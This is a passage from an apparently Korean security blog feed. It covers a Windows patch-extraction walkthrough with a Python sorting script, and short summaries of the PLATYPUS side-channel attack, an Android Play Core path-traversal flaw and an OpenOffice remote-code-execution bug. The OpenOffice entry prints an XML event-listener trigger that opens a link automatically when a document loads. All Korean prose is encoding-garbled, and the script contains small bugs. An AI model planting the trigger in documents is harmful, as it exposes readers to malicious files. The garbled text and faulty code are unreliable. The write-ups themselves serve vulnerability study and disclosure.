src="/2020/11/15/l0ch/windows-patch-diffing-part1/2.png"></p><p>ê²€ìƒ‰ì„ í•˜ë©´ ì´ë ‡ê²Œ ì—…ë°ì´íŠ¸ ëª©ë¡ë“¤ì´ ì£¼ë¥´ë¥µ ëœ¨ëŠ”ë°, Diffing í•˜ê¸¸ ì›í•˜ëŠ” íŒŒì¼ì´ íŒ¨ì¹˜ëœ ì—…ë°ì´íŠ¸ í•­ëª©ì„ ë°›ìœ¼ë©´ ë©ë‹ˆë‹¤. ì „ <code>KB4565351</code> ì„ ë°›ë„ë¡ í• ê²Œìš”.</p><h1 id="Extract-Update-Package"><a href="#Extract-Update-Package" class="headerlink" title="Extract Update Package"></a>Extract Update Package</h1><p>ì—…ë°ì´íŠ¸ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ë©´ <code>msu</code> í™•ì¥ëª…ì˜ ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ íŒ¨í‚¤ì§€ì—ì„œ íŒŒì¼ë“¤ì„ ì¶”ì¶œí•´ë‚´ë©´ ë©ë‹ˆë‹¤.</p><h2 id="Extract-msi"><a href="#Extract-msi" class="headerlink" title="Extract msi"></a>Extract msi</h2><p>PowerShellì—ì„œ <code>expand.exe -F:* &quot;[msu file name]&quot; .\\ext\\</code> ëª…ë ¹ì–´ë¡œ íŒ¨ì¹˜ ì»¨í…ì¸ ë“¤ì„ ì¶”ì¶œí•˜ë©´ ì•„ë˜ ì‚¬ì§„ê³¼ ê°™ì´ ext í´ë” ì•ˆì— ì¶”ì¶œëœ íŒŒì¼ë“¤ì´ ìˆëŠ” ê±¸ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤~</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/3.png"></p><p>cabíŒŒì¼ì´ ë³´ì´ëŠ”êµ°ìš”, ì´ê²ƒë„  ì—­ì‹œ expandë¡œ ì“±ì‹¹ ì¶”ì¶œí•˜ë„ë¡ í•˜ì£ !</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/4.png"></p><p>..?? ì™œ ì•„ë¬´ ë°˜ì‘ì´ ì—†ì§€..?</p><p>ì•„ ì™œ ì•ˆë˜ë‚˜ í–ˆë”ë‹ˆ ì¢€ ì˜¤ë˜ ê±¸ë¦¬ë‚˜ ë³´êµ°ìš” ê¸°ë‹¤ë ¤ ë´…ì‹œë‹¤ ã…</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/5.png"></p><p>ê·¸ë ‡ê²Œ <del>2000ë…„ ê°™ì€</del> í•œ ì‹œê°„ì´ ì§€ë‚˜ê³ .. í•œ 20ë¶„ ì •ë„ ê¸°ë‹¤ë¦¬ë‹¤ê°€ í¬ê¸°í•˜ê³  ì €ë… ë¨¹ê³  ì˜¤ë‹ˆê¹Œ ëë‚˜ ìˆë„¤ìš”?</p><p>ì•„ë‹ˆ ë­ ì¶”ì¶œ ì–¼ë§ˆë‚˜ í•œë‹¤ê³  ì´ë ‡ê²Œ ì˜¤ë˜ ê±¸ë¦¬ëƒ í•˜ê³  ì¶”ì¶œí•œ íŒŒì¼ ê°œìˆ˜ë¥¼ ì„¸ ë´¤ëŠ”ë°</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/6.png"></p><p>?? 3ë§Œê°œìš”?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/7.png"></p><p><em>ì•„ë‹ˆ ë¯¸ì¹œ ã…ã…</em></p><p>ëˆ„ì  ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ë¼ ì§€ê¸ˆê¹Œì§€ì˜ ì—…ë°ì´íŠ¸ë“¤ì´ ëª¨ë‘ í¬í•¨ë˜ì–´ ìˆì–´ ì´ë ‡ê²Œ ë§ë‹¤ê³  í•˜ë„¤ìš”â€¦? ì¶”ì¶œì€ ë°¥ë•Œ ë§ì¶°ì„œ ëŒë ¤ë†“ê³  ë°¥ ë¨¹ê³  ì˜¤ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤ã…‹ã…‹;</p><h2 id="Extracted-files"><a href="#Extracted-files" class="headerlink" title="Extracted files"></a>Extracted files</h2><p><code>tree /F &gt;&gt; extract.txt</code> ëª…ë ¹ì–´ë¡œ ì–´ë–¤ íŒŒì¼ë“¤ì´ ì¶”ì¶œ ë˜ì—ˆëŠ”ì§€ íŠ¸ë¦¬ êµ¬ì¡°ë¡œ í™•ì¸í•´ ë³´ë„ë¡ í•˜ì£ !</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/8.png"></p><p>ë‹¤ì–‘í•œ í˜•ì‹ì˜ íŒŒì¼, í´ë”ë“¤ì´ ì¶”ì¶œëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆë„¤ìš”.</p><ol><li><p>í´ë” ìœ í˜•</p><p>ì ‘ë‘ì–´ë¡œ ì•„í‚¤í…ì²˜ê°€ ë¶™ìŒ</p><ul><li>amd64, x86, wow64, msil</li></ul></li><li><p>íŒŒì¼ ìœ í˜•</p><ul><li>manie</li><li>cat : ë³´ì•ˆ ì¹´íƒˆë¡œê·¸</li><li>mum : ì¹´íƒˆë¡œê·¸ íŒŒì¼ê³¼ ìŒì„ ì´ë£¨ë©° ë©”íƒ€ ë°ì´í„°ê°€ í¬í•¨ë¨</li></ul></li></ol><p>ê·¸ëŸ°ë°.. ê° íŒ¨ì¹˜ í´ë” ì•ˆì— fë‘ r í´ë”ê°€ ìˆê³ , ì´ ì•ˆì— ê°ê° ê°™ì€ ì´ë¦„ì˜ ë°”ì´ë„ˆë¦¬ê°€ ë³´ì´ëŠ”ë°, ì´ê²Œ ë­˜ê¹Œìš”..?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/9.png"></p><p>f, r ê° í´ë”ëŠ” Differential í´ë”ë¡œ, ì„¸ ê°€ì§€ ìœ í˜•ì´ ìˆìŠµë‹ˆë‹¤.</p><ul><li>f: forward differential</li><li>r: reverse differential</li><li>n: null differential</li></ul><p>ì´ë“¤ì€ ê¸°ë³¸ ë²„ì „ì—ì„œ ë³€ê²½ë  ì—…ë°ì´íŠ¸ íŒŒì¼ê³¼ì˜ ì°¨ì´ë§Œí¼ì˜ ë‚´ìš©ì„ ë‹´ê³  ìˆëŠ” íŒŒì¼ì…ë‹ˆë‹¤. ì´ ë¶€ë¶„ì€ ì¤‘ìš”í•œ ë‚´ìš©ì´ë¼ ë‚˜ì¤‘ì— ë‹¤ì‹œ ì§šì–´ ë³´ë„ë¡ í•  í…Œë‹ˆ, ê¼­ ê¸°ì–µí•´ ë‘ì„¸ìš”!</p><h2 id="WinSxS"><a href="#WinSxS" class="headerlink" title="WinSxS"></a>WinSxS</h2><p>WindowsëŠ” Windowsì™€ WinSxSë¥¼ í†µí•´ ë°”ì´ë„ˆë¦¬ë¿ë§Œ ì•„ë‹ˆë¼ ëª¨ë“  ì¢…ë¥˜ì˜ íŒŒì¼ì„ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>WinSxSëŠ” manifestë¥¼ ì°¸ì¡°í•´ íŒ¨ì¹˜í•˜ë©° manifestì—ëŠ” íŒ¨ì¹˜ ì ìš© ë°©ë²•, ê²°ê³¼ íŒŒì¼ì˜ ê¶Œí•œ, ì„¤ì •í•  ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ë“± ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì „ë°˜ì ì¸ ë¦¬ìŠ¤íŠ¸ ì •ë³´ê°€ ìˆì–´ìš”. ê°„ë‹¨í•˜ê²Œ í™•ì¸í•´ ë³¼ê¹Œìš”?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/10.png"></p><p>Windows-Gaming-XboxLive-Storage-Service-Componentì— ëŒ€í•œ manifest ì •ë³´ë¥¼ ì¡°íšŒí•œ ê²°ê³¼ì…ë‹ˆë‹¤.</p><p>differential í´ë”ì¸ f, rê°€ ìˆê³ , ê°ê°ì— íŒ¨ì¹˜ë  dllê³¼ exe ë°”ì´ë„ˆë¦¬ê°€ ìˆëŠ” ê±¸ í™•ì¸í•  ìˆ˜ ìˆì–´ìš”.</p><h1 id="ì¶”ì¶œ-ìë™í™”"><a href="#ì¶”ì¶œ-ìë™í™”" class="headerlink" title="ì¶”ì¶œ ìë™í™”"></a>ì¶”ì¶œ ìë™í™”</h1><p>ê·¸ëŸ°ë° ë§ì…ë‹ˆë‹¤. ë‹¤ ì¢‹ì€ë°.. ì¶”ì¶œí•œ íŒŒì¼ ë¦¬ìŠ¤íŠ¸ë¥¼ ì¢€ ë³´ë ¤ê³  í–ˆë”ë‹ˆ ì•„í‚¤í…ì²˜ ë³„ë¡œ ë¶„ë¥˜ë„ ì—†ê³  ë’¤ì£½ë°•ì£½ ê°œíŒì´ë¼ ì§œì¦ ë‚˜ë ¤ê³  í•˜ë„¤,,^^</p><blockquote><p>ë‚ ë¡œ ë¨¹ê¸° ì¢‹ì•„í•˜ëŠ” L0chëŠ” ë°”ë¡œ ì¶”ì¶œ/ë¶„ë¥˜ ìë™í™” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§œê¸°ë¡œ í•©ë‹ˆë‹¤. ì—­ì‹œ ì› ê²Œì‹œê¸€ì—ë„ ìŠ¤í¬ë¦½íŠ¸ê°€ ìˆêµ°ìš”!<br>ê¸°ìœ í‘œì •ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚´í´ë³¸ L0chì˜ í‘œì •ì´ ì–´ë‘ì›Œì§‘ë‹ˆë‹¤. ë¬´ìŠ¨ ì¼ì´ì£ ? ì•„ ! íŒŒì›Œì‰˜ë¡œ ì§  ìŠ¤í¬ë¦½íŠ¸ë„¤ìš”!<br>ì €ëŸ°â€¦ ì• ì„í•˜ê²Œë„ L0chëŠ” íŒŒì›Œì‰˜ì„ í•´ë³¸ ì ì´ ì—†ìŠµë‹ˆë‹¤. ëˆˆë¬¼ì„ ë¨¸ê¸ˆê³  íŒŒì´ì¬ìœ¼ë¡œ ìƒˆë¡œ ì‘ì„±í•˜ëŠ” ë°©ë²•ë°–ì— ì—†ê² êµ°ìš”.</p></blockquote><pre><code class="hljs python"><span class="hljs-comment">#F**k PowerShell </span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> timeps_path = <span class="hljs-string">&#x27;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe &#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dir</span>(<span class="hljs-params">dir</span>):</span><span class="hljs-keyword">try</span>:<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>(os.path.isdir(dir)):os.makedirs(os.path.join(dir))<span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<span class="hljs-keyword">if</span> e.errno != errno.EEXIST:print(<span class="hljs-string">&quot;Failed to create directory&quot;</span>)<span class="hljs-keyword">raise</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_msu</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;*.msu&quot; ./ext/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_cab</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;./ext/Windows*.cab&quot; ./patch/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move_files</span>(<span class="hljs-params">dir, filename</span>):</span><span class="hljs-keyword">try</span>:os.popen(<span class="hljs-string">&#x27;move ./patch/&#x27;</span>+filename+<span class="hljs-string">&#x27; ./&#x27;</span>+dir)<span class="hljs-keyword">except</span>:print(<span class="hljs-string">&quot;Failed to move file&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">classification</span>():</span>output = os.popen(<span class="hljs-string">&#x27;dir /ad /b patch&#x27;</span>).read()patch_list = output.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)print(<span class="hljs-string">&quot;File classification&quot;</span>)<span class="hljs-keyword">for</span> idx, patch <span class="hljs-keyword">in</span> enumerate(patch_list):<span class="hljs-keyword">if</span> idx + <span class="hljs-number">1</span> % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:print(<span class="hljs-string">&quot;(&quot;</span>+str(idx)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)time.sleep(<span class="hljs-number">0.01</span>)platform = patch[:<span class="hljs-number">5</span>]<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;msil&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;MSIL&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;wow64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;WOW64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;amd64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;x86&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x86&#x27;</span>, patch)print(<span class="hljs-string">&quot;(&quot;</span>+str(idx + <span class="hljs-number">1</span>)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)<span class="hljs-comment"># JUNK</span>os.popen(<span class="hljs-string">&#x27;move patch JUNK&#x27;</span>)os.popen(<span class="hljs-string">&#x27;cd ext &amp;&amp; move *.txt ../&#x27;</span>)os.popen(<span class="hljs-string">&#x27;echo y | rmdir /s ext &gt; nul&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:dir_list = [<span class="hljs-string">&#x27;ext&#x27;</span>,<span class="hljs-string">&#x27;patch&#x27;</span>,<span class="hljs-string">&#x27;MSIL&#x27;</span>,<span class="hljs-string">&#x27;WOW64&#x27;</span>,<span class="hljs-string">&#x27;x64&#x27;</span>,<span class="hljs-string">&#x27;x86&#x27;</span>]<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> dir_list:create_dir(d)extract_msu()extract_cab()classification()print(<span class="hljs-string">&quot;Done&quot;</span>)time.sleep(<span class="hljs-number">3</span>)</code></pre><p>PowerShell ì¨ë³´ë ¤ê³  í–ˆëŠ”ë° 10ë¶„ë§Œì— ë•Œë ¤ì¹˜ê³  ê± ìµìˆ™í•œ íŒŒì´ì¬ ì¼ìŠµë‹ˆë‹¤ã…‹ã…‹. ìµìˆ™í•œ ê²Œ ìµœê³ ì•¼</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/11.png"></p><blockquote><p>íŒŒì´ì¬ ìµœê³ ë‹¤ì•…!! </p></blockquote><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/12.png"></p><p>msuì—ì„œ cabíŒŒì¼ì„ ì¶”ì¶œí•˜ê³ , ìœ„ ì‚¬ì§„ê³¼ ê°™ì´ cabì—ì„œ ì¶”ì¶œí•œ íŒŒì¼ë“¤ì„ ê° ì•„í‚¤í…ì²˜ í´ë”ì— ë¶„ë¥˜í–ˆìŠµë‹ˆë‹¤.<br>.manifestì™€ .mum, .cat íŒŒì¼ì€ ë“¤ì—¬ë‹¤ë³¼ ì¼ì´ ê±°ì˜ ì—†ê¸° ë•Œë¬¸ì— JUNKë¡œ ë¶„ë¥˜ë¥¼ í–ˆêµ¬ìš”.</p><p>ì´ë ‡ê²Œ ë¶„ë¥˜í•´ì„œ ì •ë¦¬ëœ ëª¨ìŠµì„ ë³´ë‹ˆ í¸ì•ˆí•˜êµ°ìš”. ì—­ì‹œ ì‚¬ëŒì€ ì •ë¦¬ë¥¼ í•˜ê³  ì‚´ì•„ì•¼ ë¼<br>ì•„ ê·¸ë˜ì„œ ì œ ë°©ì€ ì •ë¦¬í•˜ê³  ì‚¬ëƒêµ¬ìš”? ê·¸ëŸ´ ë¦¬ê°€ìš”..?</p><p>ë¶„ëŸ‰ ì¡°ì ˆ ì‹¤íŒ¨ë¡œ.. ë‹¤ìŒ ê¸€ì—ì„œëŠ” íŒ¨ì¹˜ ìœ í˜•ì„ ì•Œì•„ë³´ê³ , ë³¸ê²©ì ìœ¼ë¡œ Diffingì„ í•´ë³¼ê²Œìš”!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/13.jpg"></p><p>ì•ˆë…•íˆ ê³„ì„¸ìš” ì—¬ëŸ¬ë¶„! ì „ ì´ ì„¸ìƒì˜ ëª¨ë“  êµ´ë ˆì™€ ì†ë°•ì„ ë²—ì–´ ë˜ì§€ê³  ì œ í–‰ë³µì„ ì°¾ì•„ ë– ë‚©ë‹ˆë‹¤! (ëŒ€ì¶© ìˆ  ë¨¹ìœ¼ëŸ¬ ê°„ë‹¤ëŠ” ë§)</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Software-based Power Side-Channel Attack on x86</title>
    <link href="/2020/11/14/fabu1ous/2020-11-14/"/>
    <url>/2020/11/14/fabu1ous/2020-11-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://platypusattack.com/">PLATYPUS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Xen</p><p>Intel Processor ë‹¤ìˆ˜</p><p>Linux</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>side-channel ì •ë³´(power consumption / electro magnetic emission)ë¥¼ ì´ìš©í•´ ì‹œìŠ¤í…œì˜ operation ë° dataë¥¼ ìœ ì¶”í•˜ëŠ” ê³µê²© ë°©ë²•ì€ ì„¸ê³„ 2ì°¨ ëŒ€ì „ ë•Œë¶€í„° ì¡´ì¬í–ˆìŠµë‹ˆë‹¤. ì§€ê¸ˆê¹Œì§€ 2ê°€ì§€ í•œê³„ê°€ ì¡´ì¬í–ˆëŠ”ë° ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>ê³ ì„±ëŠ¥ì˜ Desktopì´ë‚˜ serverìš© CPU ë³´ë‹¨ ì„ë² ë””ë“œ ë§ˆì´í¬ë¡œ ì»¨íŠ¸ë¡¤ëŸ¬ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ ì¡ìŒ.</li><li>ì˜¤ì‹¤ë¡œìŠ¤ì½”í”„ ë“±ì„ ì´ìš©í•œ í•˜ë“œì›¨ì–´ ê¸°ë°˜ ê³µê²©ì´ ë§ì•˜ê³ , ì†Œí”„íŠ¸ì›¨ì–´ ê¸°ë°˜ ê³µê²©ì˜ x86 ì ìš©ì€ í¬ê²Œ ì„±ê³µì ì´ì§€ ëª»í•¨. ex) RSA key ë³µêµ¬ ì‹œë„ê°€ 2ë²ˆ ìˆì—ˆì§€ë§Œ ì‹¤íŒ¨.</li></ol><p>PLATYPUS attackì€ ì†Œí”„íŠ¸ì›¨ì–´ ê¸°ë°˜ side-channel ê³µê²©ì…ë‹ˆë‹¤. Intel RAPL interfaceì— ì ‘ê·¼í•´ power consumptionì— ëŒ€í•œ ì •ë³´ ì¶•ì  í›„ x86 ì‹œìŠ¤í…œì„ íƒ€ê²Ÿìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ í–‰ìœ„ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>instruction ë¶„ë³„, control flow monitoring</li><li>AES-NI key ì¶”ì¶œ(26ì‹œê°„ ì´ë‚´)</li><li>RSA key ë³µêµ¬(100ë¶„ ì´ë‚´)</li><li>KASLR ë¬´ë ¥í™”(20ì´ˆ ì´ë‚´)</li></ol><p>Intel RAPL(Running Average Power Limit)ì˜ ë°ì´í„°ì— ëˆ„êµ¬ë‚˜ ì ‘ê·¼í•  ìˆ˜ ìˆê³  ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ power monitoring interfaceë“¤ì˜ ì ‘ê·¼ê¶Œí•œì´ íŒ¨ì¹˜ëìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://seclists.org/oss-sec/2020/q4/109">https://seclists.org/oss-sec/2020/q4/109</a></p><p><a href="https://seclists.org/oss-sec/2020/q4/110">https://seclists.org/oss-sec/2020/q4/110</a></p><p><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html">https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html</a></p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>side-channel attack</tag>
      
      <tag>intel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Persistent arbitrary code execution in Android&#39;s Google Play Core Library</title>
    <link href="/2020/11/13/l0ch/2020-11-13/"/>
    <url>/2020/11/13/l0ch/2020-11-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/971386">CVE-2020-8913 - Persistent arbitrary code execution in Androidâ€™s Google Play Core Library</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android Play Core â‰¤ 1.7.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google APIë¥¼ í†µí•´ ì‚¬ìš©ìê°€ Play Storeì— ì ‘ê·¼í•˜ì§€ ì•Šê³  ì¸ì•± ì—…ë°ì´íŠ¸ë¥¼ í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” Play Core Libraryì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ Play Core Libraryë¥¼ ì‚¬ìš©í•˜ëŠ” ëª¨ë“  ì•ˆë“œë¡œì´ë“œ ì•±ì„ ëŒ€ìƒìœ¼ë¡œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ë¶€ë¶„ì€ <code>SplitCompat.install</code> ë¡œ, ë™ì¼í•œ ê¸°ê¸°ì— ì„¤ì¹˜ëœ íƒ€ì‚¬ ì•±ì´ ì„ì˜ì˜ ë°ì´í„°ë¥¼ broadcast í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³¼ì •ì—ì„œ <code>split_id</code> ì— ëŒ€í•œ ìœ íš¨ì„± ê²€ì‚¬ê°€ ì—†ì–´ path traversalë¥¼ í†µí•´ ì›í•˜ëŠ” ìœ„ì¹˜ì— ì„ì˜ì˜ íŒŒì¼ì„ ë³µì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë•Œ ì„ì˜ ì½”ë“œë¥¼ í¬í•¨í•˜ê³  íŒŒì¼ëª…ì´  <code>config.</code> ë¡œ ì‹œì‘í•˜ëŠ” íŒŒì¼ì„  <code>verified-splits</code> ê²½ë¡œì— ë³µì‚¬í•˜ë©´  íŒŒì¼ì´ ì•±ì˜ ëŸ°íƒ€ì„ ClassLoaderì— ì¶”ê°€ë˜ì–´ í•´ë‹¹ ì•±ì—ì„œ ì„ì˜ ì½”ë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. </p><p>ê³µê²©ìëŠ” Play Core Libraryë¥¼ ì‚¬ìš©í•˜ëŠ” ì•±ì„ íƒ€ê²Ÿìœ¼ë¡œ í•˜ëŠ” ì•…ì„± APKë¥¼ ì œì‘í•˜ê³ , í”¼í•´ìê°€ ì´ë¥¼ ì„¤ì¹˜í•˜ë„ë¡ ìœ ë„í•´ í”¼í•´ìì˜ ë°ì´í„°ë¥¼ íƒˆì·¨í•˜ê±°ë‚˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ì´ ì·¨ì•½ì ì€ Google Chromeì„ ë¹„ë¡¯í•œ ì¸ê¸° ì•±ì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì ì—ì„œ ì‹¬ê°í•œ ì·¨ì•½ì ìœ¼ë¡œ ë¶„ë¥˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>L0ch</tag>
      
      <tag>google</tag>
      
      <tag>play core library</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-13958: Apache OpenOffice RCE</title>
    <link href="/2020/11/12/idioth/2020-11-12/"/>
    <url>/2020/11/12/idioth/2020-11-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links">Apache OpenOffice RCE (CVE-2020-13958)</a></p><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links/blob/master/job-offer-CONFIDENTIAL.odt">PoC File</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache OpenOffice 4.0.0 ~ 4.1.7</li><li>Maybe OpenOffice.org versions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache OpenOffice 4ì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ LibreOfficeì—ì„œ ë°œê²¬ëœ CVE-2019-9847ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ í”„ë¡œê·¸ë¨ì—ì„œ <code>script:event-listener</code> í•¸ë“¤ëŸ¬ë¥¼ ë§¤í¬ë¡œ ì‹¤í–‰ìœ¼ë¡œ ì²˜ë¦¬í•˜ì§€ ì•Šì•„ì„œ ë°œìƒí•œ ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>ë‹¤ìŒê³¼ ê°™ì€ ìŠ¤í¬ë¦½íŠ¸ë¡œ êµ¬ì„±í•˜ì—¬ OpenOfficeì—ì„œ ì‚¬ìš©í•˜ëŠ” <code>.uno í˜¹ì€ .service</code>ë¥¼ í†µí•´ í™•ì¸ì°½ì´ë‚˜ í´ë¦­ ìœ ë„ ì—†ì´ í•˜ì´í¼ ë§í¬ë¥¼ í†µí•´ URLì„ ì—´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs vim">&lt;office:scripts&gt;   &lt;office:event-listeners&gt;    &lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span>xlink:href=<span class="hljs-string">&quot;.uno:OpenHyperlinkOnCursor&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:load&quot;</span>/&gt;   &lt;/office:event-listeners&gt;&lt;/office:scripts&gt;</code></pre><p><code>.uno .service</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¸ë¦¬ê±°í•˜ëŠ” ê²ƒì€ ë¦¬ëˆ…ìŠ¤ì—ì„œë„ ë™ì‘í•˜ì§€ë§Œ code executionìœ¼ë¡œ ì´ì–´ì§ˆë§Œí•œ ê²ƒì„ ì°¾ì§€ ëª»í–ˆë‹¤ê³  í•©ë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/">https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9847">https://nvd.nist.gov/vuln/detail/CVE-2019-9847</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>openoffice</tag>
      
      <tag>libreoffice</tag>
